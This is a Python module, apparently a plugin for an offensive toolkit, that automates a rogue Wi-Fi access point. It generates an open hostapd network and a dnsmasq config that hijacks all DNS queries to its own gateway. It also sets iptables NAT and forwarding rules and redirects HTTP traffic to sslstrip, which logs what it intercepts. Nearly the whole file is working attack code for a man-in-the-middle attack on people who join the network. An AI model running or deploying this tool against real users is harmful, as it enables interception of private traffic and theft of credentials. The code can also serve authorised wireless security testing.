# backend/plugins/rogue_ap.py
"""
Module: rogue_ap
Sets up a rogue access point (AP) with DNS hijacking and SSL stripping capabilities.
This module requires root privileges to run and appropriate tools (hostapd, dnsmasq, sslstrip, iptables, sysctl) to be installed.
"""
import os
import subprocess
import logging
import shutil
import tempfile
import time # For sleep in cleanup
from typing import Dict, Optional, List, Any

# Attempt to import from local package structure
try:
    from ..core.event_logger import log_event
except ImportError:
    # Fallback for direct execution or different environment setups
    logger_fallback = logging.getLogger(__name__)
    logger_fallback.warning("Running RogueAP with fallback imports. Ensure 'core.event_logger' is accessible.")
    def log_event(event_type: str, data: Dict[str, Any]) -> None: # type: ignore
        print(f"DUMMY_LOG_EVENT: {event_type} - {data}")


# Configure logging for this module
logger = logging.getLogger(__name__)

class RogueAP:
    """
    Manages the setup and teardown of a Rogue Access Point.

    This class automates the configuration of hostapd and dnsmasq,
    sets up IP forwarding and NAT rules using iptables, and can optionally
    run sslstrip for intercepting HTTP traffic.
    All operations require root privileges.
    """

    def __init__(self,
                 iface: str,
                 ssid: str,
                 channel: int = 6,
                 gateway_ip: str = '10.0.0.1',
                 netmask: str = '255.255.255.0',
                 wan_iface: str = 'eth0'):
        """
        Initializes the RogueAP instance.

        Args:
            iface: The wireless interface to use for the Rogue AP (e.g., 'wlan0mon').
                   This interface must support AP mode and be in monitor mode or suitable for AP mode.
            ssid: The SSID (name) of the Rogue Access Point.
            channel: The Wi-Fi channel for the Rogue AP (1-14 for 2.4GHz). Defaults to 6.
            gateway_ip: The IP address for the Rogue AP on its network (e.g., '10.0.0.1'). Defaults to '10.0.0.1'.
            netmask: The netmask for the Rogue AP's network. Defaults to '255.255.255.0'.
            wan_iface: The interface providing internet connectivity (outgoing interface for NAT).
                       Defaults to 'eth0'. This should be the interface connected to the internet.
        """
        logger.info(f"Initializing RogueAP: AP_iface='{iface}', WAN_iface='{wan_iface}', SSID='{ssid}', Channel={channel}, Gateway='{gateway_ip}'")
        log_event("rogue_ap_init_start", {
            "ap_interface": iface, "wan_interface": wan_iface, "ssid": ssid,
            "channel": channel, "gateway_ip": gateway_ip
        })
        self.iface: str = iface
        self.wan_iface: str = wan_iface # WAN interface for NAT
        self.ssid: str = ssid
        self.channel: int = channel
        self.gateway_ip: str = gateway_ip
        self.netmask: str = netmask

        self.hostapd_conf_path: Optional[str] = None
        self.dnsmasq_conf_path: Optional[str] = None
        self.sslstrip_log_path: Optional[str] = None

        self._tempdir: str = tempfile.mkdtemp(prefix="rogue_ap_")
        logger.debug(f"Created temporary directory for RogueAP configs: {self._tempdir}")

        self.processes: Dict[str, Optional[subprocess.Popen]] = {
            "hostapd": None,
            "dnsmasq": None,
            "sslstrip": None
        }
        # Check for necessary tools
        self._check_tools_installed(['hostapd', 'dnsmasq', 'sslstrip', 'iptables', 'sysctl', 'ip'])
        log_event("rogue_ap_init_complete", {"ap_interface": iface, "ssid": ssid, "temp_dir": self._tempdir})

    def _check_tools_installed(self, tools: List[str]) -> None:
        """Checks if required command-line tools are installed."""
        for tool in tools:
            if shutil.which(tool) is None:
                msg = f"Required tool '{tool}' not found in PATH. RogueAP functionality will be impaired."
                logger.error(msg)
                log_event("rogue_ap_tool_missing", {"tool": tool, "message": msg})
                # Depending on how critical, could raise an exception.
                # For now, log error and let individual operations fail if tool is used.
                # raise RuntimeError(msg) # Example if tool is absolutely critical for __init__

    def generate_configs(self) -> bool:
        """
        Generates hostapd.conf and dnsmasq.conf files in a temporary directory.

        Returns:
            True if configuration files were generated successfully, False otherwise.
        """
        try:
            # hostapd.conf
            self.hostapd_conf_path = os.path.join(self._tempdir, 'hostapd.conf')
            # Ensure interface is not too long for hostapd config
            if len(self.iface) > 15: # Max interface name length for some systems/hostapd
                 logger.warning(f"Interface name '{self.iface}' might be too long for hostapd. Max 15 chars often recommended.")

            hostapd_content = f"""
interface={self.iface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
ieee80211n=1
wmm_enabled=1
auth_algs=1
wpa=0
# For an open AP. For WPA2, different settings are needed:
# wpa=2
# wpa_passphrase=YourPasswordHere
# wpa_key_mgmt=WPA-PSK
# rsn_pairwise=CCMP
macaddr_acl=0
ignore_broadcast_ssid=0
"""
            with open(self.hostapd_conf_path, 'w') as f:
                f.write(hostapd_content)
            logger.info(f"Generated hostapd.conf at {self.hostapd_conf_path}")

            # dnsmasq.conf
            self.dnsmasq_conf_path = os.path.join(self._tempdir, 'dnsmasq.conf')
            dhcp_start_ip = '.'.join(self.gateway_ip.split('.')[:3] + ['100']) # e.g., 10.0.0.100
            dhcp_end_ip = '.'.join(self.gateway_ip.split('.')[:3] + ['200'])   # e.g., 10.0.0.200
            dnsmasq_content = f"""
# Do not use /etc/resolv.conf or other system DNS servers
no-resolv
# Upstream DNS server (e.g., Google DNS)
server=8.8.8.8
server=8.8.4.4

# Interface to listen on
interface={self.iface}
# Bind to only this interface (security)
bind-interfaces
# DHCP range, lease time 12 hours
dhcp-range={dhcp_start_ip},{dhcp_end_ip},{self.netmask},12h
# Provide gateway IP as router option
dhcp-option=option:router,{self.gateway_ip}
# Provide DNS server as this machine (dnsmasq itself)
dhcp-option=option:dns-server,{self.gateway_ip}
# Redirect all DNS queries for non-local domains to our gateway IP (for captive portal or hijacking)
address=/#/{self.gateway_ip}
# Log queries and DHCP transactions
log-queries
log-dhcp
# PID file for dnsmasq
pid-file={os.path.join(self._tempdir, 'dnsmasq.pid')}
"""
            with open(self.dnsmasq_conf_path, 'w') as f:
                f.write(dnsmasq_content)
            logger.info(f"Generated dnsmasq.conf at {self.dnsmasq_conf_path}")
            log_event("rogue_ap_configs_generated", {"hostapd_conf": self.hostapd_conf_path, "dnsmasq_conf": self.dnsmasq_conf_path})
            return True
        except IOError as e:
            logger.error(f"Error generating configuration files: {e}", exc_info=True)
            log_event("rogue_ap_config_error", {"error": str(e)})
            return False
        except Exception as e_gen: # Catch any other unexpected error
            logger.error(f"Unexpected error during config generation: {e_gen}", exc_info=True)
            log_event("rogue_ap_config_error", {"error": str(e_gen), "type": type(e_gen).__name__})
            return False


    def _run_system_command(self, cmd: List[str], check: bool = True, timeout: int = 15) -> bool:
        """Helper to run system commands, log, and handle errors."""
        cmd_str = ' '.join(cmd)
        logger.debug(f"Executing system command: {cmd_str}")
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, check=check, timeout=timeout, encoding='utf-8', errors='ignore')
            if result.stdout: logger.debug(f"Stdout from '{cmd_str}': {result.stdout.strip()}")
            if result.stderr: logger.warning(f"Stderr from '{cmd_str}' (may be info): {result.stderr.strip()}") # Some tools use stderr for info
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Command '{' '.join(e.cmd)}' failed with code {e.returncode}. Stderr: '{e.stderr.strip() if e.stderr else 'N/A'}', Stdout: '{e.stdout.strip() if e.stdout else 'N/A'}'", exc_info=True)
        except subprocess.TimeoutExpired as e:
            logger.error(f"Command '{' '.join(e.cmd)}' timed out after {timeout}s.", exc_info=True)
        except FileNotFoundError:
            logger.error(f"Command '{cmd[0]}' not found. Please ensure it is installed and in PATH.", exc_info=True)
        except Exception as e_unexp:
            logger.error(f"An unexpected error occurred running command '{cmd_str}': {e_unexp}", exc_info=True)
        return False


    def enable_forwarding(self) -> bool:
        """Enables IP forwarding using sysctl."""
        logger.info("Enabling IP forwarding (net.ipv4.ip_forward=1)...")
        if self._run_system_command(['sysctl', '-w', 'net.ipv4.ip_forward=1']):
            logger.info("Successfully enabled IP forwarding.")
            log_event("rogue_ap_ip_forwarding_enabled", {"status": "success"})
            return True
        log_event("rogue_ap_ip_forwarding_failed", {"status": "error"})
        return False

    def setup_iptables(self) -> bool:
        """Sets up iptables NAT and forwarding rules for the Rogue AP."""
        logger.info(f"Configuring iptables NAT and forwarding rules. WAN interface: '{self.wan_iface}', AP interface: '{self.iface}'.")
        # Flush existing rules (be cautious with this in a production system)
        # Consider more targeted rule deletion if this script is part of a larger system.
        if not self._run_system_command(['iptables', '-t', 'nat', '-F'], check=False): # Allow failure if already empty
             logger.warning("Failed to flush NAT table (iptables -t nat -F). This might be okay if table was empty.")
        if not self._run_system_command(['iptables', '-F'], check=False): # Allow failure if already empty
             logger.warning("Failed to flush FILTER table (iptables -F). This might be okay if table was empty.")

        rules = [
            ['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', self.wan_iface, '-j', 'MASQUERADE'],
            ['iptables', '-A', 'FORWARD', '-i', self.iface, '-o', self.wan_iface, '-j', 'ACCEPT'],
            ['iptables', '-A', 'FORWARD', '-i', self.wan_iface, '-o', self.iface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT']
        ]
        all_rules_succeeded = True
        for rule in rules:
            if not self._run_system_command(rule):
                all_rules_succeeded = False
                # Log specific rule failure
                log_event("rogue_ap_iptables_rule_failed", {"rule": ' '.join(rule)})

        if all_rules_succeeded:
            logger.info("Successfully configured iptables NAT and forwarding rules.")
            log_event("rogue_ap_iptables_success", {"wan_iface": self.wan_iface, "ap_iface": self.iface})
            return True
        else:
            logger.error("One or more iptables rules failed to apply. Check logs for details.")
            # No partial event here, overall setup failed.
            return False


    def start_sslstrip(self, port: int = 8080) -> Optional[subprocess.Popen]:
        """
        Starts sslstrip and sets up iptables rule to redirect HTTP traffic to it.

        Args:
            port: The port sslstrip should listen on. Defaults to 8080.

        Returns:
            A subprocess.Popen object for the sslstrip process if successful, None otherwise.
        """
        logger.info(f"Setting up iptables redirect for HTTP traffic to sslstrip port {port}...")
        # Redirect HTTP (port 80) traffic to sslstrip's listening port
        # This rule assumes traffic is passing through this machine (e.g., via FORWARD chain setup by setup_iptables)
        # and is destined for port 80 on any external server.
        iptables_redirect_cmd = ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.iface, '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', str(port)]
        if not self._run_system_command(iptables_redirect_cmd):
            logger.error(f"Failed to set up iptables redirect rule for sslstrip. Sslstrip will likely not function correctly.")
            log_event("rogue_ap_sslstrip_iptables_failed", {"port": port})
            return None

        logger.info(f"Successfully added iptables rule to redirect HTTP to port {port}.")
        self.sslstrip_log_path = os.path.join(self._tempdir, 'sslstrip.log')
        cmd = ['sslstrip', '-l', str(port), '-w', self.sslstrip_log_path]

        logger.info(f"Starting sslstrip: {' '.join(cmd)}")
        try:
            # Use Popen to run sslstrip in the background. Ensure errors are captured.
            # Redirect stdout/stderr to avoid polluting main logs if sslstrip is verbose.
            # Consider using a dedicated log file for sslstrip's own output if needed beyond its -w file.
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='utf-8', errors='ignore')
            logger.info(f"Sslstrip process started (PID: {proc.pid}). Log: {self.sslstrip_log_path}")
            log_event("rogue_ap_sslstrip_started", {"port": port, "log_file": self.sslstrip_log_path, "pid": proc.pid})
            return proc
        except FileNotFoundError:
            logger.error(f"Command 'sslstrip' not found. Please ensure it is installed and in PATH.", exc_info=True)
            log_event("rogue_ap_sslstrip_failed", {"reason": "sslstrip not found"})
        except Exception as e:
            logger.error(f"Failed to start sslstrip: {e}", exc_info=True)
            log_event("rogue_ap_sslstrip_failed", {"reason": str(e)})
        return None


    def start_services(self) -> bool:
        """
        Generates configurations, enables IP forwarding, sets up iptables,
        and starts hostapd, dnsmasq, and (optionally) sslstrip.

        Returns:
            True if all critical services started successfully, False otherwise.
        """
        logger.info("Starting Rogue AP services...")
        if not self.generate_configs():
            logger.error("Failed to generate Rogue AP configurations. Aborting service start.")
            return False
        if not self.enable_forwarding():
            logger.error("Failed to enable IP forwarding. Aborting service start.")
            return False
        if not self.setup_iptables(): # This now uses self.wan_iface
            logger.error("Failed to set up iptables. Aborting service start.")
            return False

        # Configure AP interface IP address and bring it up
        logger.info(f"Configuring AP interface '{self.iface}' with IP {self.gateway_ip}/{self.netmask}")
        if not self._run_system_command(['ip', 'addr', 'flush', 'dev', self.iface], check=False): # Flush existing IPs first
            logger.warning(f"Could not flush IP addresses from {self.iface}. This might be okay if it had no IPs.")
        if not self._run_system_command(['ip', 'addr', 'add', f"{self.gateway_ip}/{self.netmask}", 'dev', self.iface]):
            logger.error(f"Failed to assign IP address to {self.iface}. Aborting.")
            return False
        if not self._run_system_command(['ip', 'link', 'set', 'dev', self.iface, 'up']):
            logger.error(f"Failed to bring up interface {self.iface}. Aborting.")
            return False


        # Launch hostapd
        if self.hostapd_conf_path and shutil.which('hostapd'):
            try:
                self.processes['hostapd'] = subprocess.Popen(['hostapd', self.hostapd_conf_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                logger.info(f"Hostapd process started (PID: {self.processes['hostapd'].pid}). Config: {self.hostapd_conf_path}")
            except Exception as e:
                logger.error(f"Failed to start hostapd: {e}", exc_info=True)
                log_event("rogue_ap_service_start_failed", {"service": "hostapd", "error": str(e)})
                return False # Critical service
        else:
            logger.error("hostapd.conf not generated or hostapd command not found. Cannot start hostapd.")
            return False

        # Launch dnsmasq
        if self.dnsmasq_conf_path and shutil.which('dnsmasq'):
            try:
                # Using -k to keep dnsmasq in foreground for Popen, but it might daemonize anyway.
                # Consider --no-daemon if available and needed. Using -C for config.
                # dnsmasq needs a bit of time for hostapd to bring up the interface.
                time.sleep(2) # Small delay for interface to be fully up by hostapd.
                self.processes['dnsmasq'] = subprocess.Popen(['dnsmasq', '-C', self.dnsmasq_conf_path, '--no-daemon'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                logger.info(f"Dnsmasq process started (PID: {self.processes['dnsmasq'].pid}). Config: {self.dnsmasq_conf_path}")
            except Exception as e:
                logger.error(f"Failed to start dnsmasq: {e}", exc_info=True)
                log_event("rogue_ap_service_start_failed", {"service": "dnsmasq", "error": str(e)})
                self.cleanup() # Attempt cleanup if dnsmasq fails after hostapd
                return False # Critical service
        else:
            logger.error("dnsmasq.conf not generated or dnsmasq command not found. Cannot start dnsmasq.")
            return False

        # Launch sslstrip (optional, can proceed if it fails)
        if shutil.which('sslstrip'):
            self.processes['sslstrip'] = self.start_sslstrip()
            if not self.processes['sslstrip']:
                logger.warning("Sslstrip failed to start, but other services might be running.")
                # Not returning False here, as sslstrip might be considered optional by some.
        else:
            logger.warning("sslstrip command not found. SSL stripping will not be available.")


        logger.info("Rogue AP services initiated.")
        log_event("rogue_ap_started", {
            "ap_interface": self.iface, "ssid": self.ssid, "channel": self.channel,
            "gateway_ip": self.gateway_ip, "status": "success",
            "hostapd_pid": self.processes['hostapd'].pid if self.processes['hostapd'] else None,
            "dnsmasq_pid": self.processes['dnsmasq'].pid if self.processes['dnsmasq'] else None,
            "sslstrip_pid": self.processes['sslstrip'].pid if self.processes['sslstrip'] else None
        })
        return True

    def cleanup(self) -> None:
        """
        Stops all Rogue AP services, disables IP forwarding, flushes iptables rules,
        and removes temporary configuration files.
        This method is designed to be idempotent.
        """
        logger.info("Initiating Rogue AP cleanup sequence...")
        log_event_base = {"ap_interface": self.iface, "ssid": self.ssid}
        log_event("rogue_ap_cleanup_started", log_event_base)

        # Terminate managed processes
        for name, proc in self.processes.items():
            if proc and proc.poll() is None: # If process exists and is running
                logger.info(f"Attempting to terminate '{name}' (PID: {proc.pid})...")
                proc.terminate()
                try:
                    proc.wait(timeout=5) # Wait for graceful termination
                    logger.info(f"'{name}' (PID: {proc.pid}) terminated successfully (exit code {proc.returncode}).")
                    log_event("rogue_ap_process_stopped", {**log_event_base, "service": name, "pid": proc.pid, "method": "terminate"})
                except subprocess.TimeoutExpired:
                    logger.warning(f"'{name}' (PID: {proc.pid}) did not terminate gracefully after 5s. Killing.")
                    proc.kill()
                    try:
                        proc.wait(timeout=5) # Wait for kill
                        logger.info(f"'{name}' (PID: {proc.pid}) killed (exit code {proc.returncode}).")
                        log_event("rogue_ap_process_stopped", {**log_event_base, "service": name, "pid": proc.pid, "method": "kill"})
                    except Exception as e_kill:
                        logger.error(f"Error waiting for '{name}' (PID {proc.pid}) to die after kill: {e_kill}", exc_info=True)
                except Exception as e_term: # Other exception during wait
                    logger.error(f"Error waiting for '{name}' (PID {proc.pid}) to terminate: {e_term}", exc_info=True)
            elif proc: # Process existed but already terminated
                 logger.info(f"Service '{name}' (PID: {proc.pid}) was already stopped (exit code {proc.poll()}).")
            self.processes[name] = None # Clear from dict

        # Fallback: If Popen objects weren't tracked or failed, try pkill as a last resort.
        # This is less precise and should ideally not be needed if self.processes is managed well.
        legacy_processes_to_kill = ['hostapd', 'dnsmasq', 'sslstrip']
        for proc_name in legacy_processes_to_kill:
            if not any(p for p in [self.processes.get(pn) for pn in self.processes if pn.startswith(proc_name)] if p and p.poll() is None): # Check if already handled
                logger.debug(f"Running fallback pkill for any stray '{proc_name}' processes...")
                self._run_system_command(['pkill', '-f', proc_name], check=False) # Allow failure if not found

        # Disable IP forwarding
        logger.info("Disabling IP forwarding (net.ipv4.ip_forward=0)...")
        if self._run_system_command(['sysctl', '-w', 'net.ipv4.ip_forward=0']):
            logger.info("Successfully disabled IP forwarding.")
            log_event("rogue_ap_ip_forwarding_disabled", {**log_event_base, "status": "success"})
        else:
            logger.error("Failed to disable IP forwarding during cleanup.")
            log_event("rogue_ap_ip_forwarding_disable_failed", {**log_event_base, "status": "error"})


        # Flush relevant iptables rules more carefully
        logger.info(f"Flushing Rogue AP related iptables rules (WAN: '{self.wan_iface}', AP: '{self.iface}')...")
        # Order of deletion can be important for dependent rules.
        # Specific rule deletion is safer than -F in a complex environment.
        iptables_cleanup_rules = [
            # Remove rules from FORWARD chain
            ['iptables', '-D', 'FORWARD', '-i', self.iface, '-o', self.wan_iface, '-j', 'ACCEPT'],
            ['iptables', '-D', 'FORWARD', '-i', self.wan_iface, '-o', self.iface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
            # Remove NAT rules from POSTROUTING and PREROUTING
            ['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', self.wan_iface, '-j', 'MASQUERADE'],
            # Find the sslstrip redirect rule dynamically if possible, or remove the common one.
            # This is tricky if port was dynamic. Assuming port 8080 was used if not specified.
            # For now, using a common known port, but this should be dynamic if sslstrip port is dynamic.
            ['iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', self.iface, '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '8080']
        ]
        for rule_args in iptables_cleanup_rules:
            # Run with check=False as rules might not exist if setup failed or already cleaned.
            if self._run_system_command(rule_args, check=False):
                 logger.info(f"Successfully removed (or ensured absence of) iptables rule: {' '.join(rule_args)}")
            else:
                 logger.warning(f"Could not remove iptables rule: {' '.join(rule_args)}. It might have already been removed or never added.")

        # Optionally, a full flush if confident no other critical rules exist.
        # self._run_system_command(['iptables', '-t', 'nat', '-F'], check=False)
        # self._run_system_command(['iptables', '-F'], check=False)
        # logger.info("General iptables flush commands executed (NAT and FILTER tables).")
        log_event("rogue_ap_iptables_flushed", log_event_base)

        # Remove temporary directory and its contents
        if os.path.isdir(self._tempdir):
            logger.info(f"Removing temporary directory: {self._tempdir}")
            try:
                shutil.rmtree(self._tempdir)
                logger.info(f"Successfully removed temporary directory: {self._tempdir}")
                log_event("rogue_ap_temp_dir_removed", {**log_event_base, "temp_dir": self._tempdir})
            except Exception as e:
                logger.error(f"Error removing temporary directory '{self._tempdir}': {e}", exc_info=True)
                log_event("rogue_ap_temp_dir_remove_failed", {**log_event_base, "temp_dir": self._tempdir, "error": str(e)})
        else:
            logger.debug(f"Temporary directory '{self._tempdir}' not found, no need to remove.")

        logger.info("Rogue AP cleanup sequence finished.")
        log_event("rogue_ap_cleanup_finished", log_event_base)


if __name__ == '__main__':
    import sys # For sys.exit

    # --- Test Setup ---
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s [%(levelname)s] [%(name)s:%(lineno)d (%(funcName)s)] %(message)s",
        stream=sys.stdout
    )
    logger.info("--- Starting Rogue AP Module Test ---")

    # --- IMPORTANT: Test Prerequisites ---
    # 1. Root Privileges: This script MUST be run as root (or with `sudo`).
    # 2. Two Network Interfaces:
    #    - One wireless interface capable of AP mode (e.g., wlan0, ath0). This will be `ap_iface`.
    #    - One interface with internet connectivity (e.g., eth0, wlan1). This will be `wan_iface`.
    # 3. Required Tools: `hostapd`, `dnsmasq`, `iptables`, `sysctl`, `ip`, `sslstrip` (optional).
    #    Install them using your package manager (e.g., `sudo apt-get install hostapd dnsmasq iptables sslstrip`).
    # 4. Wireless Interface State: The `ap_iface` should ideally NOT be managed by NetworkManager
    #    or other network configuration daemons when hostapd is about to use it.
    #    `airmon-ng check kill` might be needed beforehand, or NetworkManager might need to be stopped/configured to ignore the interface.
    # ---

    # ** MODIFY THESE VALUES FOR YOUR ACTUAL TEST ENVIRONMENT **
    # Replace placeholders with your actual interface names.
    # WARNING: Running this test will reconfigure network settings and create an AP.
    # Use with caution, preferably in a controlled test environment.

    # Interface for hosting the Rogue AP (must support AP mode)
    test_ap_interface = "wlan0_ap_placeholder"  # e.g., "wlan0" or a monitor mode iface like "wlan0mon"
    # Interface connected to the internet (for NAT forwarding)
    test_wan_interface = "eth0_wan_placeholder" # e.g., "eth0" or another "wlanX"

    test_ssid = "TestRogueAP_iNTRUDER"
    test_channel = 6
    test_gateway_ip = "192.168.69.1" # Gateway for the Rogue AP's own network

    logger.info(f"--- Test Configuration ---")
    logger.info(f"AP Interface: '{test_ap_interface}'")
    logger.info(f"WAN Interface: '{test_wan_interface}'")
    logger.info(f"SSID: '{test_ssid}', Channel: {test_channel}, Gateway: {test_gateway_ip}")

    if "wlan0_ap_placeholder" == test_ap_interface or "eth0_wan_placeholder" == test_wan_interface:
        logger.critical("CRITICAL TEST SETUP ERROR: Interface names are still placeholders.")
        logger.critical("Please update 'test_ap_interface' and 'test_wan_interface' in the script.")
        sys.exit(1)

    if not shutil.which('hostapd') or not shutil.which('dnsmasq'):
        logger.critical("CRITICAL TEST SETUP ERROR: 'hostapd' or 'dnsmasq' not found. These are essential.")
        logger.critical("Please install them (e.g., sudo apt-get install hostapd dnsmasq).")
        sys.exit(1)

    logger.info("Prerequisites: Ensure you are running as root and have correctly configured interface names.")
    logger.info("The script will attempt to start a Rogue AP. Press Ctrl+C to stop and cleanup.")

    rogue_ap_instance: Optional[RogueAP] = None
    try:
        rogue_ap_instance = RogueAP(
            iface=test_ap_interface,
            ssid=test_ssid,
            channel=test_channel,
            gateway_ip=test_gateway_ip,
            wan_iface=test_wan_interface
        )

        logger.info("\n--- Generating Configurations (Test) ---")
        if rogue_ap_instance.generate_configs():
            logger.info("Configuration files generated successfully (syntax check, not functional test here).")
            logger.info(f"  hostapd.conf: {rogue_ap_instance.hostapd_conf_path}")
            logger.info(f"  dnsmasq.conf: {rogue_ap_instance.dnsmasq_conf_path}")

            # At this point, you could inspect the generated files in rogue_ap_instance._tempdir
            # For a full functional test, uncomment start_services:
            # logger.info("\n--- Starting Rogue AP Services (Full Functional Test - CAUTION) ---")
            # if rogue_ap_instance.start_services():
            #     logger.info("Rogue AP services started successfully! The AP should be broadcasting.")
            #     logger.info(f"Connect to SSID '{test_ssid}' to test.")
            #     logger.info("Press Ctrl+C to stop the Rogue AP and clean up...")
            #     while True:
            #         time.sleep(1) # Keep script alive while AP is running
            # else:
            #     logger.error("Failed to start Rogue AP services. Check logs above.")
            logger.warning("Full service start is commented out in __main__ for safety. Test focused on config generation.")
            logger.warning("To perform a full functional test, uncomment the 'start_services' block in this test script.")

        else:
            logger.error("Failed to generate configurations during test.")

    except KeyboardInterrupt:
        logger.info("\nCtrl+C detected. Initiating cleanup...")
    except Exception as e:
        logger.error(f"An error occurred during the Rogue AP test: {e}", exc_info=True)
    finally:
        if rogue_ap_instance:
            logger.info("\n--- Cleaning Up Rogue AP (Test) ---")
            rogue_ap_instance.cleanup()
        else:
            logger.info("No RogueAP instance to clean up.")

    logger.info("\n--- Rogue AP Module Test Finished ---")
